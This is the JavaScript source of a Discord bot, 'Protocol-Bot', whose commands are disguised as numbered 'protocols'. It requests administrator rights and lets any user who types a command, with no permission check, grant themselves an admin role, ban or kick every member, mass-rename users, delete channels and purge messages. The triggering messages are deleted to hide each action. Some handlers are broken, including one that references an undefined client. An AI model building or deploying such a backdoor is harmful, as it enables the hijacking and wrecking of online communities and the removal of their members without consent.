const botSettings = require("./botsettings.json");
const Discord = require("discord.js");
const bot = new Discord.Client();
const moment = require("moment");

bot.on("ready", async () => {
	console.log(`Protocol-Bot is Starting...`)
	console.log(`Protocol-bot is Online.`); // Console log telling the bot has started
	console.log(`--ACTIVE SERVER LIST--`)
	bot.guilds.map((guild) => console.log(`Name: ${guild.name} (ID: ${guild.id})`)); // Displays all servers in console
	console.log(`----------------------`)
	bot.user.setActivity(`Some Protocols`);
	try {
		console.log(`Bot Invite Link:`)
		let link = await bot.generateInvite(["ADMINISTRATOR"]); // Creates Invite Link
		console.log(link);
		console.log(`----------------------`)
	} catch(e) {
		console.log(e.stack);
	}
});

bot.on("message", async message => { 
	if (message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
	  const command = args.shift().toLowerCase();
	  
	// Makes admin Role
	if (command === `protocol-338-1`) {
  		try {
			adminrole = await message.guild.createRole({
 				name: "[REDACTED]",
  				color: "#110101",
  				permissions: [8]
			});
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Gives you admin
	if (command === `protocol-338`) {
  		try {
			let foundadmin = message.guild.roles.find(role => role.name === "[REDACTED]");
			message.member.addRole(foundadmin)
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bans Specific Person
	if (command === `protocol-872`) {
		try {
			var member= message.mentions.members.first(); member.ban()
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bans everyone
	if (command === `protocol-872-1`) {
		try {
			message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}
	
	// Kicks everyone
	if (command === `protocol-975-1`) {
		try {
			message.guild.members.filter(member => member.kickable).forEach(member => {member.kick()});
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Kicks Specific Person
	if (command === `protocol-975`) {
		try {
			var member= message.mentions.members.first(); member.kick()
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}
	
	// Mute Specific Person
	if (command === `protocol-471`) {
		try {
			let foundterm = message.guild.roles.find(role => role.name === "Terminated");
			var member= message.mentions.members.first(); member.addRole(foundterm)
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

   // UnMute Specific Person
	if (command === `protocol-471-3`) {
		try {
			let foundterm = message.guild.roles.find(role => role.name === "Terminated");
			var member= message.mentions.members.first(); member.removeRole(foundterm)
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}
	   
	// Make Mute Role
	if (command === `protocol-471-1`) {
		try {
			message.delete()
			termrole = await message.guild.createRole({
 				name: "Terminated",
  				color: "#110101",
  				permissions: []
			}) 
			message.guild.channels.forEach(async (channel, id) => {
                await channel.overwritePermissions(termrole, {
                    SEND_MESSAGES: false,
                    ADD_REACTIONS: false,
                    SEND_TTS_MESSAGES: false,
                    ATTACH_FILES: false,
                    CREATE_INSTANT_INVITE: false,
                    READ_MESSAGE_HISTORY: false,
                    MANAGE_ROLES: false,
                    SPEAK: false
                })
            })
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Rename someone
	if (command === `protocol-296`) {
		try {
            var member= message.mentions.members.first(); member.setNickname()
            let nickName = args.join(" ").slice(22);
			member.setNickname(nickName);
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	} 

    // Rename everyone
	if (command === `protocol-296-1`) {
		try {
            bot.on('message', msg => {
				if (msg.guild && msg.content.startsWith('$protocol-296-1')) {
				  let text = msg.content.slice('$protocol-296-1'.length); 
				  msg.guild.members.forEach(member => {
					if (member.id != bot.user.id && !member.user.bot) member.setNickname(text).catch(() => console.log(`User's Nickname Was Unchangable: ${member.user.tag}`));
					message.delete()
				  });
				}
			  });
		} catch(e) {
			console.log(e.stack);
		}
	}

    // remove rank from specific
	if (command === `protocol-996`) {
		try {
            message.delete()
			let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
            let role = args.join(" ").slice(22);
            let gRole = message.guild.roles.find(`name`, role);
            await(rMember.removeRole(gRole.id));
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Delete Channel
	if (command === `protocol-517`) {
		try {
			message.channel.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Announcement
	if (command === `protocol-624`) {
		try {
			message.delete()
			message.channel.send('@everyone An Announcement Will Now Begin.');
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Clear Messages
	if (command === `protocol-072`) {
		try {
			message.delete()
			message.channel.bulkDelete(args[0]).then(msg => msg.delete(5000));
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Display a users info
	if (command === `protocol-413-1`) {
		try {
			message.delete()
			const status = {
				online: "Online",
				idle: "Idle",
				dnd: "Do Not Disturb",
				offline: "Offline/Invisible"
			  };
			const mb = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
			  message.author.send({embed:{
				  color: 5447003,
				  title: "Name",
				  description: mb.user.tag,
				  fields: [{
					name: "UserID",
					value: mb.user.id
				},
		
				{
					name: "Nickname: ",
					value: `${mb.nickname !== null ? `${mb.nickname}` : "No nickname"}`
				  },
				  {
					  name: "Status",
					  value: `${status[mb.user.presence.status]}`
				  },
				  {
					name: "\nPlaying",
					value: `${mb.user.presence.game ? `${mb.user.presence.game.name}` : "Nothing"}`
				  },
				  {
					  name: "Joined at",
					  value: moment(mb.joinedAt).format('MMMM Do YYYY h:mm:ss')
				  },
				  {
					name: "Created at",
					value: moment(mb.createdAt).format("MMMM Do YYYY, h:mm a")
				  },
				  {
				  name: "Roles",
				  value: `${mb.roles.filter(r => r.id !== message.guild.id).map(roles => `\`${roles.name}\``).join(" **|** ") || "No Roles"}`
				  }
				],
				timestamp: new Date(),
				footer: {
					text: "UserInfo"
				}
			}});
		}
		 catch(e) {
			console.log(e.stack);
		}
	}

	// List Server Info
	if (command === `protocol-413`) {
		try {
			message.delete()
			function checkDays(date) {
				let now = new Date();
				let diff = now.getTime() - date.getTime();
				let days = Math.floor(diff / 86400000);
				return days + (days == 1 ? " day" : " days") + " ago";
			};
			let verifLevels = ["None", "Low", "Medium", "(╯°□°）╯︵  ┻━┻", "┻━┻ミヽ(ಠ益ಠ)ノ彡┻━┻"];
			let region = {
				"brazil": ":flag_br: Brazil",
				"eu-central": ":flag_eu: Central Europe",
				"singapore": ":flag_sg: Singapore",
				"us-central": ":flag_us: U.S. Central",
				"sydney": ":flag_au: Sydney",
				"us-east": ":flag_us: U.S. East",
				"us-south": ":flag_us: U.S. South",
				"us-west": ":flag_us: U.S. West",
				"eu-west": ":flag_eu: Western Europe",
				"vip-us-east": ":flag_us: VIP U.S. East",
				"london": ":flag_gb: London",
				"amsterdam": ":flag_nl: Amsterdam",
				"hongkong": ":flag_hk: Hong Kong",
				"russia": ":flag_ru: Russia",
				"southafrica": ":flag_za:  South Africa"
			};
			const embedserver = new Discord.RichEmbed()
				.setAuthor(message.guild.name, message.guild.iconURL)
				.addField("Name", message.guild.name, true)
				.addField("ID", message.guild.id, true)
				.addField("Owner", `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`, true)
				.addField("Region", region[message.guild.region], true)
				.addField("Total | Humans | Bots", `${message.guild.members.size} | ${message.guild.members.filter(member => !member.user.bot).size} | ${message.guild.members.filter(member => member.user.bot).size}`, true)
				.addField("Verification Level", verifLevels[message.guild.verificationLevel], true)
				.addField("Channels", message.guild.channels.size, true)
				.addField("Roles", message.guild.roles.size, true)
				.addField("Creation Date", `${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`, true)
				.setThumbnail(message.guild.iconURL)
				.setColor(`0x00ff00`)
			message.author.send(embedserver);
			}
		 catch(e) {
			console.log(e.stack);
		}
	}

	// Uptime Counter
	if (command === `protocol-221`) {
		try {
			message.delete()
			let u = convertMS(bot.uptime);
    let uptime = u.d + " days : " + u.h + " hours : " + u.m + " minutes : " + u.s + " seconds"




    const duration = moment.duration(bot.uptime)
    let bicon = bot.user.displayAvatarURL;
    const botembed = new Discord.RichEmbed()
        .setColor(`0x00ff00`)
        .addField(`**Uptime :**  ${uptime}`, `Protocol-Bot`)

    message.channel.send(botembed);

function convertMS(ms) {
    var d, h, m, s;
    s = Math.floor(ms / 1000);
    m = Math.floor(s / 60);
    s = s % 60;
    h = Math.floor(m / 60);
    m = m % 60;
    d = Math.floor(h / 24);
    h = h % 24;
    return {
        d: d
        , h: h
        , m: m
        , s: s
    };
};

		} catch(e) {
			console.log(e.stack);
		}
	}

	// Lock and Unlock channel
	if (command === `protocol-497-l`) {
		try {
			client.on('message', message => {
				if(message.content.startsWith("$" + "protocol-497-u")) {
				  message.channel.overwritePermissions(message.guild.id, {
					SEND_MESSAGES: null
				});
				  }
				});
			  client.on('message', message => {
				  if(message.content.startsWith("$" + "protocol-497-l")) {
				  
					message.channel.overwritePermissions(message.guild.id, {
					  SEND_MESSAGES: false
				  });
				  }
				  });
				  message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Makes the bot say something
	if (command === `protocol-114`) {
		try {
			let botmessage = args.join(" ");
            message.delete().catch();
            message.channel.send(botmessage);
		} catch(e) {
			console.log(e.stack);
		}
	}

	// In Server Help Command
        if (command === `protocol-001`) {
		try {
			message.delete()
			message.channel.send('Protocol List: 001, 002, 296, 296-1, 338, 338-1, 624, 114, 072, 672, 975, 975-1, 872, 872-1, 471, 471-1, 471-3, 996, 517, 413, 413-1, 221.');
		} catch(e) {
			console.log(e.stack);
		}
	}
            const embed = new Discord.RichEmbed()
            .setDescription('001 - In Server Help\n002 - In DMs Help\n338 - Give Yourself Admin\n338-1 - Create Admin Role\n624 - Start Announcement\n975 - Kick a specific person\n975-1 - Kick Everyone\n872 - Ban a specific person\n872-1 - Ban Everyone\n471 - Mute a specific person\n471-1 Create Muted Role\n471-3 - Unmute a person\n296 - Rename a specific person\n296-1 - Rename Everyone (Leave it blank to reset all names)\n996 - Remove a rank from a specific person\n072 - Wipe chosen amount of messages\n114 - Make the bot say something you tell it to\n517 - Delete The Current Channel\n413 - Displays Server Info\n413-1 - Displays a specified users info\n221 - Uptime Counter\n497-l - Lock the channel\n497-u - Unlock the channel\n672 - Bot leaves the server')
			.setAuthor('Protocol List')
			.setColor(0xd40000)

    // DM Help Command
        if (command === `protocol-002`) {
		try {
			message.delete()
            message.author.send(embed);
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bot leaves
	if(command === `protocol-672`) {
   		try {
			message.delete()
   			message.guild.leave();
   		} catch(e) {
			console.log(e.stack);
   		}
   	}
});
// To Do: finished
bot.login(botSettings.token);